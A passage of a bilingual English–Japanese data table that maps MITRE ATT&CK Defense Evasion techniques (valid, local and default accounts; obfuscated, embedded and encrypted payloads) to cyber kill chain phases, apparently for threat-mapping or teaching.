攻撃者は、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)やパスワードの再利用など、さまざまな手段を通じて、一部は高レベルの特権を持つドメインアカウントを侵害し、ドメインの特権リソースへのアクセスを許可する可能性があります。","Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)

Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1078,有効なアカウント,Valid Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。

場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)

システムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)","Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",T1078.003,ローカルアカウント,Local Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、ローカルアカウントの資格情報を取得して悪用する可能性があります。ローカルアカウントとは、ユーザー、リモートサポート、サービス、または単一のシステムやサービスの管理のために組織によって構成されたものです。

ローカルアカウントは、[OS資格情報ダンピング](https://attack.mitre.org/techniques/T1003)を通じて権限を昇格させたり、資格情報を収集したりするために悪用されることもあります。パスワードの再利用により、権限昇格や横方向の移動を目的として、ネットワーク上の一連のマシンでローカルアカウントが悪用される可能性があります。","Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1078,有効なアカウント,Valid Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、既存のアカウントの資格情報を取得して悪用する可能性があります。侵害された資格情報は、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。(引用: volexity_0day_sophos_FW) 侵害された資格情報は、攻撃者に特定のシステムに対する権限の昇格や、ネットワークの制限された領域へのアクセスを許可する可能性もあります。攻撃者は、これらの資格情報が提供する正当なアクセスと組み合わせてマルウェアやツールを使用しないことを選択し、その存在を検出することをより困難にする場合があります。

場合によっては、攻撃者は非アクティブなアカウントを悪用することがあります。例えば、組織の一員ではなくなった個人に属するアカウントなどです。これらのアカウントを使用すると、元のアカウントユーザーが自分のアカウントで行われている異常なアクティビティを特定するために存在しないため、攻撃者は検出を回避できる可能性があります。(引用: CISA MFA PrintNightmare)

システムのネットワーク全体にわたるローカル、ドメイン、およびクラウドアカウントの権限の重複は懸念事項です。なぜなら、攻撃者はアカウントやシステムをまたいでピボットし、高レベルのアクセス（つまり、ドメインまたはエンタープライズ管理者）に到達して、エンタープライズ内で設定されたアクセス制御をバイパスできる可能性があるためです。(引用: TechNet Credential Theft)","Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",T1078.001,デフォルトアカウント,Default Accounts,"攻撃者は、初期アクセス、永続化、権限昇格、または防御回避の手段として、デフォルトアカウントの資格情報を取得して悪用する可能性があります。デフォルトアカウントとは、WindowsシステムのゲストアカウントやAdministratorアカウントなど、OSに組み込まれているアカウントです。デフォルトアカウントには、AWSのルートユーザーアカウント、ESXiのルートユーザーアカウント、Kubernetesのデフォルトサービスアカウントなど、他の種類のシステム、ソフトウェア、またはデバイスのデフォルトの工場出荷時/プロバイダー設定アカウントも含まれます。(引用: Microsoft Local Accounts Feb 2019)(引用: AWS Root User)(引用: Threat Matrix for Kubernetes)

デフォルトアカウントはクライアントマシンに限定されません。むしろ、内部、オープンソース、または商用であるかどうかにかかわらず、ネットワークデバイスやコンピュータアプリケーションなどの機器にあらかじめ設定されているアカウントも含まれます。ユーザー名とパスワードの組み合わせがあらかじめ設定されているアプライアンスは、インストール後に変更しない組織にとっては攻撃者の格好の標的となるため、深刻な脅威となります。同様に、攻撃者は、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモート環境に正当に接続するために、公に開示された、または盗まれた[秘密キー](https://attack.mitre.org/techniques/T1552/004)または資格情報資料を利用することもあります。(引用: Metasploit SSH Module)

デフォルトアカウントは、別のアプリケーションに接続または統合することにより、初期設定後にシステム上に作成される場合があります。例えば、ESXiサーバーがvCenterサーバーに接続されると、ESXiサーバー上に`vpxuser`というデフォルトの特権アカウントが作成されます。脅威アクターがこのアカウントの資格情報を侵害できた場合（例えば、vCenterホスト上の[資格情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)を介して）、ESXiサーバーにアクセスできるようになります。(引用: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用: Pentera vCenter Information Disclosure)","Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.005,ツールからのインジケーター削除,Indicator Removal from Tools,"攻撃者は、自分の悪意のあるツールが検出、隔離、またはその他の方法で抑制されたと判断した場合、ツールからインジケーターを削除する可能性があります。彼らはインジケーターを削除してツールを変更し、ターゲットの防御システムや同様のシステムを使用する可能性のある後続のターゲットによって検出されなくなった更新バージョンを使用できます。

この良い例は、マルウェアがファイル署名で検出され、ウイルス対策ソフトウェアによって隔離された場合です。マルウェアがファイル署名のために隔離されたと判断できる攻撃者は、その署名を明示的に回避するようにファイルを変更し、その後マルウェアを再利用する可能性があります。","Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.009,埋め込みペイロード,Embedded Payloads,"攻撃者は、防御から悪意のあるコンテンツを隠すために、他のファイル内にペイロードを埋め込む可能性があります。一見無害に見えるファイル（スクリプトや実行可能ファイルなど）が悪用されて、悪意のあるペイロードやコンテンツを運び、難読化する可能性があります。場合によっては、埋め込みペイロードにより、デジタル署名や公証チケットなどの実行制御に影響を与えずに、攻撃者が[信頼制御の破壊](https://attack.mitre.org/techniques/T1553)を可能にすることもあります。(引用: Sentinel Labs)

攻撃者は、ペイロードを隠すためにさまざまなファイル形式にペイロードを埋め込む可能性があります。(引用: Microsoft Learn) これは[ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)に似ていますが、正当なデジタルメディア形式に関連する特定のバイトやパターンに悪意のあるコンテンツを織り込むことはありません。(引用: GitHub PSImage)

例えば、攻撃者はペイロードを良性のバイナリ内またはそのオーバーレイとして埋め込んでいることが確認されています。(引用: Securelist Dtrack2) 攻撃者はまた、同じ形式のファイル内にペイロード（実行可能ファイルや実行専用スクリプトなど）をネストしていることも確認されています。(引用: SentinelLabs reversing run-only applescripts 2021)

埋め込みコンテンツは、良性のシステムプロセスに感染させるために使用される[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)ペイロードとして使用されることもあります。(引用: Trend Micro) これらの埋め込まれた後注入されたペイロードは、オーケストレーターモジュールをサポートするためにC2通信を暗号化するなどの特定の機能を提供するように設計されたマルウェアのモジュールの一部として使用される場合があります。例えば、埋め込みモジュールがデフォルトのブラウザに注入され、攻撃者がネットワーク経由で通信できるようになる場合があります。(引用: Malware Analysis Report ComRAT)","Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs)

Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) 

For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021)

Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.013,暗号化/エンコードされたファイル,Encrypted/Encoded File,"攻撃者は、文字列、バイト、その他の特定のパターンを難読化して検出を妨げるために、ファイルを暗号化またはエンコードする可能性があります。ファイルのコンテンツを暗号化および/またはエンコードすることは、侵入で使用されるファイル内の悪意のあるアーティファクトを隠蔽することを目的としています。[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)、[ステガノグラフィ](https://attack.mitre.org/techniques/T1027/003)、[埋め込みペイロード](https://attack.mitre.org/techniques/T1027/009)など、他の多くのテクニックもこの広範な目的を共有しています。ファイルを暗号化および/またはエンコードすると、静的署名の検出が遅れる可能性があり、この悪意のあるコンテンツは実行/使用時にのみ明らかになります（つまり、[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)）。

このタイプのファイル難読化は、マルウェアのログ/構成ファイルやペイロードファイルなど、被害者ホスト上に存在する多くのファイルアーティファクトに適用できます。(引用: File obfuscation) ファイルは、ハードコードされたキーまたはユーザー提供のキーで暗号化したり、Base64などの標準エンコーディングスキームを使用して他の方法で難読化したりできます。

ファイルのコンテンツ全体を難読化することも、特定の関数や値（C2アドレスなど）のみを難読化することもできます。暗号化とエンコーディングは、追加の保護のために冗長なレイヤーで適用される場合もあります。

